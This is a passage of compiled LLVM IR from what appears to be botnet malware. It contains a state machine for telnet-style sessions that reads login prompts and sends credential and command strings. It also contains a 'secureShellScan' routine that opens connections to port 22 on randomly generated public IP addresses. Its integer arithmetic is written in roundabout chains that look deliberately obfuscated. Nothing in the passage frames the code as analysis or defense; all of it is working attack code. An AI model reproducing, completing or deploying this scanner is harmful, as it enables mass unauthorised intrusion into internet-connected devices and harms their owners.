  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 7
  %1775 = load i16, i16* %1774, align 16
  %1776 = zext i16 %1775 to i32
  %1777 = call i32 @readUntil(i32 %1765, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1770, i32 1024, i32 %1776)
  %1778 = icmp ne i32 %1777, 0
  br i1 %1778, label %1779, label %1854

; <label>:1779:                                   ; preds = %1760
  %1780 = load i32, i32* %2, align 4
  %1781 = sext i32 %1780 to i64
  %1782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1781
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1782, i32 0, i32 6
  store i32 0, i32* %1783, align 4
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1786, i32 0, i32 7
  store i16 0, i16* %1787, align 16
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 8
  %1792 = load i8*, i8** %1791, align 8
  %1793 = call i8* @strstr(i8* %1792, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1794 = icmp ne i8* %1793, null
  br i1 %1794, label %1795, label %1815

; <label>:1795:                                   ; preds = %1779
  %1796 = load i32, i32* %2, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1797
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1798, i32 0, i32 8
  %1800 = load i8*, i8** %1799, align 8
  call void @llvm.memset.p0i8.i64(i8* %1800, i8 0, i64 1024, i32 1, i1 false)
  %1801 = load i32, i32* %2, align 4
  %1802 = sext i32 %1801 to i64
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 0
  %1805 = load i32, i32* %1804, align 16
  %1806 = call i32 @sclose(i32 %1805)
  %1807 = load i32, i32* %2, align 4
  %1808 = sext i32 %1807 to i64
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1808
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1809, i32 0, i32 2
  store i8 0, i8* %1810, align 8
  %1811 = load i32, i32* %2, align 4
  %1812 = sext i32 %1811 to i64
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1812
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1813, i32 0, i32 3
  store i8 0, i8* %1814, align 1
  br label %2093

; <label>:1815:                                   ; preds = %1779
  %1816 = load i32, i32* %2, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1817
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1818, i32 0, i32 8
  %1820 = load i8*, i8** %1819, align 8
  %1821 = call i32 @matchPrompt(i8* %1820)
  %1822 = icmp ne i32 %1821, 0
  br i1 %1822, label %1843, label %1823

; <label>:1823:                                   ; preds = %1815
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 8
  %1828 = load i8*, i8** %1827, align 8
  call void @llvm.memset.p0i8.i64(i8* %1828, i8 0, i64 1024, i32 1, i1 false)
  %1829 = load i32, i32* %2, align 4
  %1830 = sext i32 %1829 to i64
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1830
  %1832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1831, i32 0, i32 0
  %1833 = load i32, i32* %1832, align 16
  %1834 = call i32 @sclose(i32 %1833)
  %1835 = load i32, i32* %2, align 4
  %1836 = sext i32 %1835 to i64
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1836
  %1838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1837, i32 0, i32 2
  store i8 0, i8* %1838, align 8
  %1839 = load i32, i32* %2, align 4
  %1840 = sext i32 %1839 to i64
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1840
  %1842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1841, i32 0, i32 3
  store i8 1, i8* %1842, align 1
  br label %2093

; <label>:1843:                                   ; preds = %1815
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 2
  store i8 7, i8* %1847, align 8
  br label %1848

; <label>:1848:                                   ; preds = %1843
  %1849 = load i32, i32* %2, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 8
  %1853 = load i8*, i8** %1852, align 8
  call void @llvm.memset.p0i8.i64(i8* %1853, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1854:                                   ; preds = %1760
  %1855 = load i32, i32* %2, align 4
  %1856 = sext i32 %1855 to i64
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1856
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1857, i32 0, i32 0
  %1859 = load i32, i32* %1858, align 16
  %1860 = load i32, i32* %2, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 8
  %1864 = load i8*, i8** %1863, align 8
  %1865 = load i32, i32* %2, align 4
  %1866 = sext i32 %1865 to i64
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1866
  %1868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1867, i32 0, i32 7
  %1869 = load i16, i16* %1868, align 16
  %1870 = zext i16 %1869 to i32
  %1871 = call i32 @readUntil(i32 %1859, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1864, i32 1024, i32 %1870)
  %1872 = icmp ne i32 %1871, 0
  br i1 %1872, label %1873, label %1948

; <label>:1873:                                   ; preds = %1854
  %1874 = load i32, i32* %2, align 4
  %1875 = sext i32 %1874 to i64
  %1876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1875
  %1877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1876, i32 0, i32 6
  store i32 0, i32* %1877, align 4
  %1878 = load i32, i32* %2, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1879
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1880, i32 0, i32 7
  store i16 0, i16* %1881, align 16
  %1882 = load i32, i32* %2, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1883
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1884, i32 0, i32 8
  %1886 = load i8*, i8** %1885, align 8
  %1887 = call i8* @strstr(i8* %1886, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1888 = icmp ne i8* %1887, null
  br i1 %1888, label %1889, label %1909

; <label>:1889:                                   ; preds = %1873
  %1890 = load i32, i32* %2, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 8
  %1894 = load i8*, i8** %1893, align 8
  call void @llvm.memset.p0i8.i64(i8* %1894, i8 0, i64 1024, i32 1, i1 false)
  %1895 = load i32, i32* %2, align 4
  %1896 = sext i32 %1895 to i64
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1896
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1897, i32 0, i32 0
  %1899 = load i32, i32* %1898, align 16
  %1900 = call i32 @sclose(i32 %1899)
  %1901 = load i32, i32* %2, align 4
  %1902 = sext i32 %1901 to i64
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1902
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1903, i32 0, i32 2
  store i8 0, i8* %1904, align 8
  %1905 = load i32, i32* %2, align 4
  %1906 = sext i32 %1905 to i64
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1906
  %1908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1907, i32 0, i32 3
  store i8 0, i8* %1908, align 1
  br label %2093

; <label>:1909:                                   ; preds = %1873
  %1910 = load i32, i32* %2, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1911
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1912, i32 0, i32 8
  %1914 = load i8*, i8** %1913, align 8
  %1915 = call i32 @matchPrompt(i8* %1914)
  %1916 = icmp ne i32 %1915, 0
  br i1 %1916, label %1937, label %1917

; <label>:1917:                                   ; preds = %1909
  %1918 = load i32, i32* %2, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1919
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1920, i32 0, i32 8
  %1922 = load i8*, i8** %1921, align 8
  call void @llvm.memset.p0i8.i64(i8* %1922, i8 0, i64 1024, i32 1, i1 false)
  %1923 = load i32, i32* %2, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1924
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1925, i32 0, i32 0
  %1927 = load i32, i32* %1926, align 16
  %1928 = call i32 @sclose(i32 %1927)
  %1929 = load i32, i32* %2, align 4
  %1930 = sext i32 %1929 to i64
  %1931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1930
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1931, i32 0, i32 2
  store i8 0, i8* %1932, align 8
  %1933 = load i32, i32* %2, align 4
  %1934 = sext i32 %1933 to i64
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1934
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1935, i32 0, i32 3
  store i8 1, i8* %1936, align 1
  br label %2093

; <label>:1937:                                   ; preds = %1909
  %1938 = load i32, i32* %2, align 4
  %1939 = sext i32 %1938 to i64
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1939
  %1941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1940, i32 0, i32 2
  store i8 7, i8* %1941, align 8
  br label %1942

; <label>:1942:                                   ; preds = %1937
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 8
  %1947 = load i8*, i8** %1946, align 8
  call void @llvm.memset.p0i8.i64(i8* %1947, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1948:                                   ; preds = %1854
  %1949 = load i32, i32* %2, align 4
  %1950 = sext i32 %1949 to i64
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1950
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1951, i32 0, i32 8
  %1953 = load i8*, i8** %1952, align 8
  %1954 = call i64 @strlen(i8* %1953) #10
  %1955 = trunc i64 %1954 to i16
  %1956 = load i32, i32* %2, align 4
  %1957 = sext i32 %1956 to i64
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1957
  %1959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1958, i32 0, i32 7
  store i16 %1955, i16* %1959, align 16
  br label %1960

; <label>:1960:                                   ; preds = %1948
  br label %1961

; <label>:1961:                                   ; preds = %1960
  br label %1962

; <label>:1962:                                   ; preds = %1961
  br label %1963

; <label>:1963:                                   ; preds = %1962
  br label %1964

; <label>:1964:                                   ; preds = %1963
  br label %1965

; <label>:1965:                                   ; preds = %1964
  br label %1966

; <label>:1966:                                   ; preds = %1965
  br label %1967

; <label>:1967:                                   ; preds = %1966
  %1968 = load i32, i32* %2, align 4
  %1969 = sext i32 %1968 to i64
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1969
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1970, i32 0, i32 6
  %1972 = load i32, i32* %1971, align 4
  %1973 = sub i32 0, 10
  %1974 = sub i32 %1972, %1973
  %1975 = add i32 %1972, 10
  %1976 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1977 = icmp ult i32 %1974, %1976
  br i1 %1977, label %1978, label %1993

; <label>:1978:                                   ; preds = %1967
  %1979 = load i32, i32* %2, align 4
  %1980 = sext i32 %1979 to i64
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1980
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1981, i32 0, i32 0
  %1983 = load i32, i32* %1982, align 16
  %1984 = call i32 @sclose(i32 %1983)
  %1985 = load i32, i32* %2, align 4
  %1986 = sext i32 %1985 to i64
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1986
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1987, i32 0, i32 2
  store i8 0, i8* %1988, align 8
  %1989 = load i32, i32* %2, align 4
  %1990 = sext i32 %1989 to i64
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1990
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1991, i32 0, i32 3
  store i8 1, i8* %1992, align 1
  br label %1993

; <label>:1993:                                   ; preds = %1978, %1967
  br label %2092

; <label>:1994:                                   ; preds = %70
  %1995 = load i32, i32* %2, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1996
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1997, i32 0, i32 0
  %1999 = load i32, i32* %1998, align 16
  %2000 = call i64 @send(i32 %1999, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %2001 = icmp slt i64 %2000, 0
  br i1 %2001, label %2002, label %2017

; <label>:2002:                                   ; preds = %1994
  %2003 = load i32, i32* %2, align 4
  %2004 = sext i32 %2003 to i64
  %2005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2004
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2005, i32 0, i32 0
  %2007 = load i32, i32* %2006, align 16
  %2008 = call i32 @sclose(i32 %2007)
  %2009 = load i32, i32* %2, align 4
  %2010 = sext i32 %2009 to i64
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2010
  %2012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2011, i32 0, i32 2
  store i8 0, i8* %2012, align 8
  %2013 = load i32, i32* %2, align 4
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2014
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2015, i32 0, i32 3
  store i8 1, i8* %2016, align 1
  br label %2093

; <label>:2017:                                   ; preds = %1994
  %2018 = load i32, i32* %2, align 4
  %2019 = sext i32 %2018 to i64
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2019
  %2021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2020, i32 0, i32 2
  store i8 8, i8* %2021, align 8
  br label %2092

; <label>:2022:                                   ; preds = %70
  %2023 = load i32, i32* %2, align 4
  %2024 = sext i32 %2023 to i64
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2024
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2025, i32 0, i32 6
  %2027 = load i32, i32* %2026, align 4
  %2028 = icmp eq i32 %2027, 0
  br i1 %2028, label %2029, label %2035

; <label>:2029:                                   ; preds = %2022
  %2030 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2031 = load i32, i32* %2, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2032
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2033, i32 0, i32 6
  store i32 %2030, i32* %2034, align 4
  br label %2035

; <label>:2035:                                   ; preds = %2029, %2022
  %2036 = load i32, i32* %2, align 4
  %2037 = sext i32 %2036 to i64
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2037
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2038, i32 0, i32 0
  %2040 = load i32, i32* %2039, align 16
  %2041 = call i64 @send(i32 %2040, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i32 0, i32 0), i64 194, i32 16384)
  %2042 = icmp slt i64 %2041, 0
  br i1 %2042, label %2043, label %2063

; <label>:2043:                                   ; preds = %2035
  %2044 = load i32, i32* %2, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 0
  %2048 = load i32, i32* %2047, align 16
  %2049 = call i32 @sclose(i32 %2048)
  %2050 = load i32, i32* %2, align 4
  %2051 = sext i32 %2050 to i64
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2051
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2052, i32 0, i32 2
  store i8 0, i8* %2053, align 8
  %2054 = load i32, i32* %2, align 4
  %2055 = sext i32 %2054 to i64
  %2056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2055
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2056, i32 0, i32 3
  store i8 1, i8* %2057, align 1
  %2058 = load i32, i32* %2, align 4
  %2059 = sext i32 %2058 to i64
  %2060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2059
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2060, i32 0, i32 8
  %2062 = load i8*, i8** %2061, align 8
  call void @llvm.memset.p0i8.i64(i8* %2062, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:2063:                                   ; preds = %2035
  %2064 = load i32, i32* %2, align 4
  %2065 = sext i32 %2064 to i64
  %2066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2065
  %2067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2066, i32 0, i32 6
  %2068 = load i32, i32* %2067, align 4
  %2069 = sub i32 0, %2068
  %2070 = sub i32 0, 10
  %2071 = add i32 %2069, %2070
  %2072 = sub i32 0, %2071
  %2073 = add i32 %2068, 10
  %2074 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2075 = icmp ult i32 %2072, %2074
  br i1 %2075, label %2076, label %2091

; <label>:2076:                                   ; preds = %2063
  %2077 = load i32, i32* %2, align 4
  %2078 = sext i32 %2077 to i64
  %2079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2078
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2079, i32 0, i32 0
  %2081 = load i32, i32* %2080, align 16
  %2082 = call i32 @sclose(i32 %2081)
  %2083 = load i32, i32* %2, align 4
  %2084 = sext i32 %2083 to i64
  %2085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2084
  %2086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2085, i32 0, i32 2
  store i8 0, i8* %2086, align 8
  %2087 = load i32, i32* %2, align 4
  %2088 = sext i32 %2087 to i64
  %2089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2088
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2089, i32 0, i32 3
  store i8 1, i8* %2090, align 1
  br label %2091

; <label>:2091:                                   ; preds = %2076, %2063
  br label %2092

; <label>:2092:                                   ; preds = %2091, %2017, %1993, %1178, %1114, %763, %699, %407, %228, %70
  br label %2093

; <label>:2093:                                   ; preds = %2092, %2043, %2002, %1942, %1917, %1889, %1848, %1823, %1795, %1754, %1729, %1701, %1660, %1635, %1607, %1566, %1541, %1513, %1472, %1447, %1419, %1378, %1353, %1325, %1284, %1259, %1231, %1163, %1140, %1052, %1029, %1006, %983, %960, %937, %914, %891, %877, %826, %748, %725, %638, %609, %546, %517, %466, %326, %178, %148
  %2094 = load i32, i32* %2, align 4
  %2095 = sub i32 0, %2094
  %2096 = sub i32 0, 1
  %2097 = add i32 %2095, %2096
  %2098 = sub i32 0, %2097
  %2099 = add nsw i32 %2094, 1
  store i32 %2098, i32* %2, align 4
  br label %66

; <label>:2100:                                   ; preds = %66
  br label %64
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @secureShellScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %63

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 0, %57
  %59 = sub i32 0, 1
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %57, 1
  store i32 %61, i32* %2, align 4
  br label %37

; <label>:63:                                     ; preds = %37
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %64, align 8
  %65 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %65, align 8
  br label %66

; <label>:66:                                     ; preds = %1999, %63
  br label %67

; <label>:67:                                     ; preds = %66
  store i32 0, i32* %2, align 4
  br label %68

; <label>:68:                                     ; preds = %1992, %67
  %69 = load i32, i32* %2, align 4
  %70 = load i32, i32* %1, align 4
  %71 = icmp slt i32 %69, %70
  br i1 %71, label %72, label %1999

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* %2, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 2
  %77 = load i8, i8* %76, align 8
  %78 = zext i8 %77 to i32
  switch i32 %78, label %1991 [
    i32 0, label %79
    i32 1, label %242
    i32 2, label %410
    i32 3, label %570
    i32 4, label %638
    i32 5, label %985
    i32 6, label %1053
    i32 7, label %1865
    i32 8, label %1893
    i32 9, label %1921
  ]

; <label>:79:                                     ; preds = %72
  %80 = load i32, i32* %2, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 8
  %84 = load i8*, i8** %83, align 8
  call void @llvm.memset.p0i8.i64(i8* %84, i8 0, i64 1024, i32 1, i1 false)
  %85 = load i32, i32* %2, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 3
  %89 = load i8, i8* %88, align 1
  %90 = icmp ne i8 %89, 0
  br i1 %90, label %91, label %111

; <label>:91:                                     ; preds = %79
  %92 = load i32, i32* %2, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 8
  %96 = load i8*, i8** %95, align 8
  store i8* %96, i8** %11, align 8
  %97 = load i32, i32* %2, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %98
  %100 = bitcast %struct.telstate_t* %99 to i8*
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 32, i32 16, i1 false)
  %101 = load i8*, i8** %11, align 8
  %102 = load i32, i32* %2, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 8
  store i8* %101, i8** %105, align 8
  %106 = call i32 @getRandomPublicIP()
  %107 = load i32, i32* %2, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 1
  store i32 %106, i32* %110, align 4
  br label %155

